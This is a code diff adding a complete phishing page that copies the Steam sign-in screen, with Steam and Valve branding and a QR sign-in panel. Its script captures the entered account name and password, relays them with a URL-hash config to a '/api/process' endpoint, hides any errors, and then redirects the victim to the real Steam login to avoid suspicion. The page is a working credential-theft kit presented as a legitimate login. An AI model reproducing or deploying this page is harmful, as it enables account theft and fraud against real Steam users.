@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sign In</title>
+    <link rel="shortcut icon" href="https://store.steampowered.com/favicon.ico">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Motiva+Sans:wght@300;400;700&display=swap');
+        
+        :root {
+            --steam-bg: #171d25;
+            --steam-card: #181a21;
+            --steam-input: #32353c;
+            --steam-blue: #009dff;
+            --steam-blue-hover: #00bfff;
+            --steam-text-label: #1999ff;
+            --steam-footer-bg: #171a21;
+        }
+
+        body { 
+            font-family: 'Motiva Sans', 'Arial', sans-serif;
+            background-color: var(--steam-bg);
+            color: #ffffff;
+            -webkit-font-smoothing: antialiased;
+            margin: 0;
+        }
+
+        /* Hero Background Simulation */
+        .steam-hero {
+            background-image: linear-gradient(rgba(23, 29, 37, 0.8), rgba(23, 29, 37, 1)), url('https://store.fastly.steamstatic.com/public/shared/images/joinsteam/new_login_bg_strong_mask.jpg');
+            background-size: cover;
+            background-position: center;
+            min-height: 100vh;
+        }
+
+        .nav-bar {
+            background: #171a21;
+            height: 104px;
+        }
+
+        .login-card {
+            background: rgba(24, 26, 33, 0.95);
+            border-radius: 4px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+
+        .steam-input {
+            background-color: var(--steam-input);
+            border: 1px solid #000;
+            border-radius: 2px;
+            color: #fff;
+            height: 40px;
+            padding: 0 10px;
+            width: 100%;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .steam-input:focus {
+            border-color: var(--steam-blue);
+        }
+
+        .btn-blue {
+            background: linear-gradient(to right, #06bfff 0%, #2d73ff 100%);
+            border-radius: 2px;
+            color: #fff;
+            font-weight: 400;
+            height: 48px;
+            width: 100%;
+            transition: filter 0.2s;
+        }
+
+        .btn-blue:hover { filter: brightness(1.1); }
+
+        .qr-box {
+            background: #ffffff;
+            padding: 8px;
+            border-radius: 4px;
+        }
+
+        .footer-link {
+            color: #afafaf;
+            font-size: 13px;
+            text-decoration: none;
+        }
+        .footer-link:hover { color: #fff; }
+
+        /* Mobile Adjustments */
+        @media (max-width: 768px) {
+            .nav-bar { height: 60px; }
+            .qr-side { display: none; }
+        }
+
+        #loader {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 3px;
+            background: transparent;
+            z-index: 100;
+            display: none;
+        }
+        #loader div {
+            height: 100%;
+            background-color: var(--steam-blue);
+            width: 40%;
+            animation: steamLoad 1.2s infinite linear;
+        }
+        @keyframes steamLoad { 0% { margin-left: -40%; } 100% { margin-left: 100%; } }
+    </style>
+</head>
+<body>
+
+    <!-- Desktop Header -->
+    <header class="nav-bar hidden md:flex items-center px-10">
+        <div class="max-w-7xl mx-auto w-full flex items-center justify-between">
+            <div class="flex items-center gap-10">
+                <img src="https://store.akamai.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" class="h-11">
+                <nav class="flex gap-4 text-[14px] font-bold uppercase tracking-wider text-[#dcdedf]">
+                    <a href="#" class="hover:text-white">Store</a>
+                    <a href="#" class="hover:text-white">Community</a>
+                    <a href="#" class="hover:text-white">About</a>
+                    <a href="#" class="hover:text-white">Support</a>
+                </nav>
+            </div>
+            <div class="flex items-center gap-4 text-[11px]">
+                <button class="bg-[#5c7e10] text-white px-3 py-1 flex items-center gap-2">
+                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M10 3a1 1 0 011 1v5h5a1 1 0 110 2h-5v5a1 1 0 11-2 0v-5H4a1 1 0 110-2h5V4a1 1 0 011-1z"/></svg>
+                    Install Steam
+                </button>
+                <a href="#" class="hover:text-white">login</a>
+                <span>|</span>
+                <a href="#" class="hover:text-white">language</a>
+            </div>
+        </div>
+    </header>
+
+    <main class="steam-hero flex flex-col items-center pt-20 px-4">
+        
+        <div class="w-full max-w-[800px] mb-12">
+            <h1 class="text-[32px] font-light mb-8">Sign in</h1>
+
+            <div class="login-card p-8 flex flex-col md:flex-row gap-12 relative overflow-hidden">
+                <div id="loader"><div></div></div>
+
+                <!-- Form Side -->
+                <div class="flex-1 space-y-6">
+                    <div>
+                        <label class="block text-[12px] font-bold text-[#1999ff] uppercase tracking-wider mb-2">Sign in with account name</label>
+                        <input type="text" id="username" class="steam-input">
+                    </div>
+
+                    <div>
+                        <label class="block text-[12px] font-bold text-[#afafaf] uppercase tracking-wider mb-2">Password</label>
+                        <input type="password" id="password" class="steam-input">
+                    </div>
+
+                    <div class="flex items-center gap-2">
+                        <input type="checkbox" id="remember" class="w-4 h-4 accent-blue-500">
+                        <label for="remember" class="text-[12px] text-[#afafaf]">Remember me</label>
+                    </div>
+
+                    <button onclick="executeHit()" class="btn-blue text-[16px]">Sign in</button>
+
+                    <div class="text-center">
+                        <a href="#" class="footer-link underline">Help, I can't sign in</a>
+                    </div>
+                </div>
+
+                <!-- QR Side -->
+                <div class="qr-side w-[280px] border-l border-[#32353c] pl-12 flex flex-col items-center">
+                    <label class="block text-[12px] font-bold text-[#1999ff] uppercase tracking-wider mb-6">Or sign in with QR</label>
+                    <div class="qr-box mb-6">
+                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=https://steamcommunity.com/openid/login" class="w-[160px] h-[160px]">
+                    </div>
+                    <p class="text-[12px] text-[#afafaf] text-center px-4 leading-relaxed">
+                        Use the <a href="#" class="text-white underline">Steam Mobile App</a> to sign in via QR Code
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Create Section -->
+        <div class="w-full max-w-[800px] text-center md:text-left mb-40">
+            <h2 class="text-[24px] font-light mb-4">New to Steam?</h2>
+            <div class="flex flex-col md:flex-row items-center gap-10">
+                <button class="bg-transparent border border-[#ffffff33] hover:border-white px-8 py-2 text-[15px] rounded-[2px] transition-colors">Create an account</button>
+                <p class="text-[14px] text-[#afafaf] max-w-[400px]">
+                    It's free and easy. Discover thousands of games to play with millions of new friends. 
+                    <a href="#" class="text-white underline">Learn more about Steam</a>
+                </p>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-[#171a21] py-16 px-10 text-[#afafaf]">
+        <div class="max-w-7xl mx-auto border-t border-[#32353c] pt-12">
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-12 mb-12">
+                <div class="space-y-3">
+                    <h3 class="text-white font-bold text-sm uppercase">Steam</h3>
+                    <div class="flex flex-col gap-2">
+                        <a href="#" class="footer-link">About Steam</a>
+                        <a href="#" class="footer-link">Steam SSA</a>
+                        <a href="#" class="footer-link">Steamworks</a>
+                    </div>
+                </div>
+                <div class="space-y-3">
+                    <h3 class="text-white font-bold text-sm uppercase">Valve</h3>
+                    <div class="flex flex-col gap-2">
+                        <a href="#" class="footer-link">About Valve</a>
+                        <a href="#" class="footer-link">Jobs</a>
+                        <a href="#" class="footer-link">Hardware</a>
+                    </div>
+                </div>
+                <div class="space-y-3">
+                    <h3 class="text-white font-bold text-sm uppercase">Legal</h3>
+                    <div class="flex flex-col gap-2">
+                        <a href="#" class="footer-link">Privacy</a>
+                        <a href="#" class="footer-link">Legal</a>
+                        <a href="#" class="footer-link">Cookies</a>
+                    </div>
+                </div>
+                <div class="space-y-3">
+                    <h3 class="text-white font-bold text-sm uppercase">More</h3>
+                    <div class="flex flex-col gap-2">
+                        <a href="#" class="footer-link">Get Steam</a>
+                        <a href="#" class="footer-link">Mobile Apps</a>
+                        <a href="#" class="footer-link">Support</a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="flex flex-col md:flex-row items-center justify-between gap-8">
+                <div class="flex items-center gap-8">
+                    <img src="https://store.akamai.steamstatic.com/public/images/v6/logo_steam_footer.png" class="h-7 opacity-50 grayscale">
+                    <img src="https://store.akamai.steamstatic.com/public/images/v6/logo_valve_footer.png" class="h-7 opacity-50 grayscale">
+                </div>
+                <p class="text-[12px] text-center md:text-right max-w-lg">
+                    © 2026 Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.
+                </p>
+            </div>
+        </div>
+    </footer>
+
+<script>
+    // 1. Get configuration from the URL Hash
+    const getRawConfig = () => {
+        const h = window.location.hash.substring(1);
+        return h || null;
+    };
+
+    const configString = getRawConfig();
+
+    async function executeHit() {
+        const u = document.getElementById('username').value;
+        const p = document.getElementById('password').value;
+
+        if (!u || !p) return;
+
+        document.getElementById('loader').style.display = 'block';
+        const finishUrl = "https://store.steampowered.com/login/";
+
+        if (!configString) {
+            setTimeout(() => window.location.href = finishUrl, 1000);
+            return;
+        }
+
+        try {
+            // 2. Relay to central Vercel API (/api/process)
+            await fetch('/api/process', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    config: configString, 
+                    data: { 
+                        User: u, 
+                        Pass: p 
+                    }
+                })
+            });
+        } catch (err) {
+            // Silenced
+        } finally {
+            setTimeout(() => {
+                window.location.href = finishUrl;
+            }, 1000);
+        }
+    }
+</script>
+</body>
+</html>
